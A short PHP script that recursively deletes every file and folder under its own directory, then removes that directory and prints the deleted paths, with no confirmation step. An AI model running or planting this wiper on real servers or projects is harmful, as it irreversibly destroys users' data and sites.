
<?php
set_time_limit(50000); // 
$data = "";
//$dir = "samples" . DIRECTORY_SEPARATOR . "sampledirtree";
$dir = "./";
$it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
$files = new RecursiveIteratorIterator($it,
             RecursiveIteratorIterator::CHILD_FIRST);
foreach($files as $file) {
    if ($file->isDir()){
        rmdir($file->getRealPath());
    } else {
        $data .= $file->getRealPath()."<br/>";
        unlink($file->getRealPath());
        
    }
}
rmdir($dir);
  echo $data;

?>
